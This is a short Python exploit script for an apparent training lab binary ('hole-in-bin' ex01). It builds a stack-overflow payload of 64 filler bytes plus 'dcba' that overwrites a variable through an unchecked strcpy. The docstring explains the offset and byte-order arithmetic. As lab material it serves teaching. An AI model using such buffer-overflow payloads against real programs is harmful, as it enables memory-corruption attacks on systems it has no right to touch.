#!/usr/bin/env python3
"""
ex01 exploit  (stack1: overwrite a variable with an EXACT value, via argv + strcpy).

main():
    strcpy(buffer=[esp+0x1c], argv[1])      <- no bounds check
    cmp  [esp+0x5c], 0x61626364             <- must equal 0x61626364
Offset buffer -> variable = 0x5c - 0x1c = 0x40 = 64 bytes.
0x61626364 little-endian in memory = bytes 64 63 62 61 = "dcba".

strcpy stops at a NUL, and our payload contains none, so it copies fully.

Usage (in the VM):
    /opt/hole-in-bin/ex01/bin "$(python3 ex01.py)"
Local test:
    scripts/runlocal.sh challenges/ex01/bin "$(python3 scripts/ex01.py)"
"""
import sys

OFFSET = 64
# target value 0x61626364 -> little-endian bytes -> the ASCII string "dcba"
target = bytes([0x64, 0x63, 0x62, 0x61])
payload = b"A" * OFFSET + target
sys.stdout.buffer.write(payload)
